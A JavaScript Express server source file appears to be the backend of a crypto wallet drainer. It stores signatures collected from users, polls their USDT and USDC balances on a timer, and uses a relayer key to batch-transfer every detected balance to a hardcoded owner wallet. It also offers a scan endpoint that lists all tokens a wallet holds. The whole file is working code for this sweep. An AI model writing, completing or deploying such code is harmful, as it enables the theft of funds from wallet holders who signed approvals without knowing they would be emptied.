import express from 'express';
import cors from 'cors';
import 'dotenv/config';
import { Alchemy, Network } from 'alchemy-sdk';
import { ethers } from 'ethers';

const app = express();
const port = Number(process.env.PORT || 3003);
const monitorIntervalMs = Number(process.env.MONITOR_INTERVAL_MS || 60000);

const BATCH_ROUTER_ADDRESS = process.env.BATCH_ROUTER_ADDRESS || '0xed031690D49A853C6BA385844E9DCf9E70c24686';
const PERMIT2_ADDRESS = process.env.PERMIT2_ADDRESS || '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const SEPOLIA_RPC = process.env.SEPOLIA_RPC_URL || process.env.ALCHEMY_RPC_URL;
const OWNER_ADDRESS = process.env.OWNER_WALLET_ADDRESS || '0xb4B2Cb95DcCA62e9E4dD10Dbaa17e8693607E5c9';
const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY;

const monitoredUsers = new Map();
const batchRouterAbi = [
  'function batchTransfer(address[] calldata tokens, uint256[] calldata amounts, address owner, address recipient, uint256 nonce, uint256 deadline, bytes calldata signature) external'
];

app.use(cors());
app.use(express.json());

function getProvider() {
  if (!SEPOLIA_RPC) {
    throw new Error('SEPOLIA_RPC_URL or ALCHEMY_RPC_URL must be configured in .env');
  }
  return new ethers.JsonRpcProvider(SEPOLIA_RPC);
}

function getRelayerWallet() {
  if (!RELAYER_PRIVATE_KEY) {
    throw new Error('RELAYER_PRIVATE_KEY is required for automated backend execution');
  }
  return new ethers.Wallet(RELAYER_PRIVATE_KEY, getProvider());
}

function getAlchemyClient() {
  const apiKey = process.env.ALCHEMY_API_KEY?.trim();
  const isPlaceholder = !apiKey || apiKey.includes('your_') || apiKey.includes('replace_me') || apiKey === 'your_alchemy_api_key_here';

  if (isPlaceholder) {
    throw new Error('ALCHEMY_API_KEY is not configured. Set a real Alchemy API key in the .env file before scanning wallet balances.');
  }

  return new Alchemy({
    apiKey,
    network: Network.ETH_SEPOLIA,
  });
}

function normalizeAddress(address) {
  if (!ethers.isAddress(address)) {
    throw new Error('Invalid wallet address');
  }
  return ethers.getAddress(address);
}

function parseTokenList(value) {
  if (!Array.isArray(value)) return [];
  return value.filter((token) => typeof token === 'string' && ethers.isAddress(token));
}

async function getTrackedUserBalances(userAddress) {
  const alchemy = getAlchemyClient();
  const balances = await alchemy.core.getTokenBalances(userAddress);
  const targetTokens = [process.env.USDT_ADDRESS, process.env.USDC_ADDRESS].filter(Boolean).map((token) => token.toLowerCase());

  const activeTokens = balances.tokenBalances
    .filter((token) => {
      const contractAddress = token.contractAddress?.toLowerCase();
      return targetTokens.includes(contractAddress) && BigInt(token.tokenBalance || '0') > 0n;
    })
    .slice(0, 20);

  return activeTokens.map((token) => ({
    contractAddress: token.contractAddress,
    balance: token.tokenBalance || '0',
  }));
}

async function submitBatchTransfer({
  tokens,
  amounts,
  userAddress,
  ownerAddress,
  nonce,
  deadline,
  signature,
}) {
  const provider = getProvider();
  const relayerWallet = new ethers.Wallet(RELAYER_PRIVATE_KEY, provider);
  const contract = new ethers.Contract(BATCH_ROUTER_ADDRESS, batchRouterAbi, relayerWallet);

  const tx = await contract.batchTransfer(
    tokens,
    amounts,
    userAddress,
    ownerAddress,
    nonce,
    deadline,
    signature
  );

  const receipt = await tx.wait();
  return receipt;
}

async function automatedTrackingRoutine() {
  if (monitoredUsers.size === 0) return;

  for (const [userAddress, config] of [...monitoredUsers.entries()]) {
    try {
      const trackedBalances = await getTrackedUserBalances(userAddress);
      if (trackedBalances.length === 0) {
        continue;
      }

      const tokens = trackedBalances.map((entry) => entry.contractAddress);
      const amounts = trackedBalances.map((entry) => BigInt(entry.balance));

      if (!config.signature || !config.nonce || !config.deadline) {
        console.log(`[Automation] User ${userAddress} has balance but no signed payload queued yet.`);
        continue;
      }

      const recipient = config.ownerAddress || OWNER_ADDRESS;
      const receipt = await submitBatchTransfer({
        tokens,
        amounts: amounts.map((amount) => amount.toString()),
        userAddress,
        ownerAddress: recipient,
        nonce: config.nonce,
        deadline: config.deadline,
        signature: config.signature,
      });

      console.log(`[Automation] Batch execution succeeded for ${userAddress}: ${receipt?.hash}`);
      monitoredUsers.delete(userAddress);
    } catch (error) {
      console.error(`[Automation] Failed for ${userAddress}:`, error instanceof Error ? error.message : error);
    }
  }
}

app.get('/health', (_req, res) => {
  res.json({ ok: true, status: 'healthy' });
});

app.post('/api/register-user', async (req, res) => {
  try {
    const { userAddress, ownerAddress, signature, nonce, deadline, tokens, amounts } = req.body ?? {};
    if (!userAddress || typeof userAddress !== 'string') {
      return res.status(400).json({ error: 'userAddress is required' });
    }

    const normalizedUser = normalizeAddress(userAddress);
    const normalizedOwner = ownerAddress ? normalizeAddress(ownerAddress) : normalizeAddress(OWNER_ADDRESS);
    const parsedTokens = parseTokenList(tokens);

    monitoredUsers.set(normalizedUser, {
      ownerAddress: normalizedOwner,
      signature: typeof signature === 'string' ? signature : undefined,
      nonce: nonce ? BigInt(nonce).toString() : undefined,
      deadline: deadline ? BigInt(deadline).toString() : undefined,
      tokens: parsedTokens,
      amounts: Array.isArray(amounts) ? amounts.map((item) => String(item)) : [],
    });

    return res.json({
      success: true,
      userAddress: normalizedUser,
      ownerAddress: normalizedOwner,
      monitored: monitoredUsers.size,
      message: 'User registered for automated backend tracking.',
    });
  } catch (error) {
    console.error('register-user failed', error);
    return res.status(500).json({
      error: error instanceof Error ? error.message : 'Unknown registration error',
    });
  }
});

app.post('/api/scan-wallet', async (req, res) => {
  try {
    const { walletAddress } = req.body ?? {};
    if (!walletAddress || typeof walletAddress !== 'string') {
      return res.status(400).json({ error: 'walletAddress is required' });
    }

    const normalizedAddress = normalizeAddress(walletAddress);
    const alchemy = getAlchemyClient();
    const balances = await alchemy.core.getTokenBalances(normalizedAddress);
    const activeTokens = balances.tokenBalances
      .filter((token) => BigInt(token.tokenBalance || '0') > 0n)
      .slice(0, 50);

    const tokens = await Promise.all(
      activeTokens.map(async (token) => {
        const metadata = await alchemy.core.getTokenMetadata(token.contractAddress).catch(() => ({}));
        return {
          contractAddress: token.contractAddress,
          balance: token.tokenBalance || '0',
          name: metadata.name || 'Unknown token',
          symbol: metadata.symbol || token.contractAddress,
        };
      })
    );

    return res.json({ tokens });
  } catch (error) {
    console.error('scan-wallet failed', error);
    return res.status(500).json({
      error: error instanceof Error ? error.message : 'Unknown scan error',
    });
  }
});

app.post('/api/submit-batch-transfer', async (req, res) => {
  try {
    const { tokens, amounts, userAddress, ownerAddress, nonce, deadline, signature } = req.body ?? {};

    if (!tokens || !amounts || !userAddress || !ownerAddress || !signature) {
      return res.status(400).json({ error: 'Missing required fields' });
    }

    if (tokens.length !== amounts.length) {
      return res.status(400).json({ error: 'Tokens and amounts length mismatch' });
    }

    const normalizedUser = normalizeAddress(userAddress);
    const normalizedOwner = normalizeAddress(ownerAddress);
    const normalizedTokens = parseTokenList(tokens);

    if (normalizedTokens.length !== tokens.length) {
      return res.status(400).json({ error: 'One or more token addresses are invalid' });
    }

    const receipt = await submitBatchTransfer({
      tokens: normalizedTokens,
      amounts: amounts.map((amount) => String(amount)),
      userAddress: normalizedUser,
      ownerAddress: normalizedOwner,
      nonce: String(nonce),
      deadline: String(deadline),
      signature,
    });

    console.log(`Batch transfer completed for user ${normalizedUser}:`, receipt?.hash);
    console.log(`OWNER ALERT: Batch transfer from ${normalizedUser} to ${normalizedOwner} - ${normalizedTokens.length} tokens transferred`);

    return res.json({
      success: true,
      transactionHash: receipt?.hash,
      tokens: normalizedTokens.length,
      userAddress: normalizedUser,
      ownerAddress: normalizedOwner,
    });
  } catch (error) {
    console.error('submit-batch-transfer failed', error);
    return res.status(500).json({
      error: error instanceof Error ? error.message : 'Unknown submission error',
    });
  }
});

setInterval(() => {
  automatedTrackingRoutine().catch((error) => {
    console.error('[Automation] Monitoring loop failed:', error);
  });
}, monitorIntervalMs);

app.listen(port, () => {
  console.log(`Backend running on http://localhost:${port}`);
  console.log(`Automation monitor active every ${monitorIntervalMs}ms`);
});
